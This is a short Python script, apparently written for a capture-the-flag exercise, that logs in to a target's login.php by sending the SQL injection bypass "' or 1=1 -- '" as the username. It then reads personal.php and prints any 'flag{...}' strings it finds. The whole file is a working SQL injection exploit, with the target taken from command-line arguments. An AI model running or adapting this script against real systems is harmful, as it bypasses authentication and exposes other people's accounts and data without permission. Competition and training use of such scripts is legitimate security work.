import re
import requests
from bs4 import BeautifulSoup
import sys
def Sql_exp(ip, port):
    # 创建一个会话对象
    session = requests.Session()

    # 发送一个 POST 请求，并自动处理重定向
    response = session.post(f'http://{ip}:{port}/login.php', data={'username': "' or 1=1 -- '", 'password': '2'})
    if response.status_code != 200:
        print('web error!')
        exit()

    # 打印响应的文本内容
    if 'alert' in response.text:
        pattern = r'alert\("(.+?)"\)'
        matches = re.findall(pattern, response.text)
        print(matches)
        exit()

    # 发送一个 GET 请求，并自动处理重定向
    response = session.get(f'http://{ip}:{port}/personal.php')

    if response.status_code != 200:
        print('web error!')
        exit()

    response.encoding = 'utf8'
    outcome = response.text.encode('gbk', 'ignore').decode('gbk')
    soup = BeautifulSoup(outcome, 'html.parser')

    # 查找flag
    flag = None
    count = 0
    for tag in soup.find_all('p', {'class': 'info_show'}):
        pattern = r'flag\{[^\}]+\}'
        matches = re.findall(pattern, tag.text)
        if matches:
            for match in matches:
                print(match)
                count += 1

    if count == 0:
        print("SQL attack failed!")
if __name__ == '__main__':
    # 获取命令行参数
    ip=sys.argv[1]
    port=int(sys.argv[2])
    Sql_exp(ip, port)